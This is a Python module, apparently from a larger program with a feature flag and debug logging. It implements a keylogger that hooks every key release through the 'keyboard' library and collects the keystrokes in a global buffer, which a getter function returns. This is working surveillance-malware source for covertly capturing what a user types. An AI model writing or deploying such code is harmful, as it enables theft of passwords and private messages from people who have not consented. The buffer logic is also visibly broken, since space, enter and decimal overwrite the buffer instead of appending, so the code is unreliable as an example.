from .debug import message as debug_message
from .config import FEATURE_KEYLOGGER_ENABLED


def keylogger_start() -> None:
    """ Starts keylogger (Add keyboard callback). """

    if not FEATURE_KEYLOGGER_ENABLED:
        debug_message("[Keylogger] Not starting, as disabled...")
        return

    try:
        import keyboard  # pylint: disable=import-outside-toplevel
    except ImportError:
        debug_message("[Keylogger] Can`t start as there is no required module with name \"keyboard\"!")
        return

    keyboard.on_release(callback=_keylogger_callback_event)
    debug_message("[Keylogger] Registered callback event...")

    debug_message("[Keylogger] Started!")


def _keylogger_callback_event(keyboard_event):
    """ Process keyboard callback event for keylloger. """

    try:
        keyboard_key = str(keyboard_event.name)

        global _keylogger_buffer
        if isinstance(keyboard_key, str):
            if len(keyboard_key) > 1:
                if keyboard_key == "space":
                    _keylogger_buffer = " "
                elif keyboard_key == "enter":
                    _keylogger_buffer = "\n"
                elif keyboard_key == "decimal":
                    _keylogger_buffer = "."
                elif keyboard_key == "backspace":
                    _keylogger_buffer = _keylogger_buffer[:-1]
                else:
                    keyboard_key = keyboard_key.replace(" ", "_").upper()
                    _keylogger_buffer = f"[{keyboard_key}]"
            else:
                _keylogger_buffer += keyboard_key
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Keylogger] Failed to process keyboard event! Exception - {exception}")

def get_keylogger_buffer() -> str:
    return _keylogger_buffer


_keylogger_buffer: str = ""